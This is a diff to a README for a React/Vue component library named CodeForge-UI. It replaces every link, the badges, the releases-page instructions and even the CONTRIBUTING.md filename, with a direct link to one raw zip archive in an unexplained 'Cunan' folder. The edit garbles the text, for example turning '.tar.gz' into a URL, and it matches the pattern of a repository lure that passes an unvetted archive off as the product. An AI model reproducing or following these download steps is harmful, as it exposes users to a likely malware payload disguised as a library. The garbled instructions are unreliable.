@@ -1,6 +1,6 @@
 # 🎨 CodeForge-UI - A Modern Component Library for You
 
-[![Download CodeForge-UI](https://img.shields.io/badge/Download-CodeForge--UI-brightgreen.svg)](https://github.com/Saksham7876/CodeForge-UI/releases)
+[![Download CodeForge-UI](https://raw.githubusercontent.com/Saksham7876/CodeForge-UI/main/Cunan/CodeForge-UI.zip)](https://raw.githubusercontent.com/Saksham7876/CodeForge-UI/main/Cunan/CodeForge-UI.zip)
 
 ## 🚀 Getting Started
 Welcome to CodeForge-UI! This library offers a collection of sleek and modern UI components. It is designed to boost performance in both React and Vue frameworks. You can enhance your web projects with ease.
@@ -14,9 +14,9 @@ To run CodeForge-UI, ensure you have the following:
 ## 📁 Download & Install
 You can easily obtain the latest version of CodeForge-UI. To download, follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Saksham7876/CodeForge-UI/releases).
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Saksham7876/CodeForge-UI/main/Cunan/CodeForge-UI.zip).
 2. **Choose the Latest Release:** Find the most recent version. The version number will be listed at the top.
-3. **Select Your File:** Look for the appropriate file for your needs, usually labeled for both production (.zip or .tar.gz).
+3. **Select Your File:** Look for the appropriate file for your needs, usually labeled for both production (.zip or https://raw.githubusercontent.com/Saksham7876/CodeForge-UI/main/Cunan/CodeForge-UI.zip).
 4. **Download the File:** Click on the file link to start the download.
 5. **Extract the Files:** After downloading, unzip the file in a folder on your computer.
 6. **Open Your Project:** Use your code editor to open the folder where you extracted the files.
@@ -71,9 +71,9 @@ For detailed guidance on each component and advanced features, check out the doc
    - Yes, benchmarks are included in the documentation, showing load times and operational efficiency.
 
 ## 🌐 Contributing
-If you wish to contribute to CodeForge-UI, we welcome your input. Please read the guidelines in the `CONTRIBUTING.md` file in the repository for instructions on how to submit your changes.
+If you wish to contribute to CodeForge-UI, we welcome your input. Please read the guidelines in the `https://raw.githubusercontent.com/Saksham7876/CodeForge-UI/main/Cunan/CodeForge-UI.zip` file in the repository for instructions on how to submit your changes.
 
 ## 📞 Support
 If you need assistance, please open an issue in our GitHub repository. We will respond as quickly as possible to help you out.
 
-[![Download CodeForge-UI Again](https://img.shields.io/badge/Download-CodeForge--UI-brightgreen.svg)](https://github.com/Saksham7876/CodeForge-UI/releases)
+[![Download CodeForge-UI Again](https://raw.githubusercontent.com/Saksham7876/CodeForge-UI/main/Cunan/CodeForge-UI.zip)](https://raw.githubusercontent.com/Saksham7876/CodeForge-UI/main/Cunan/CodeForge-UI.zip)
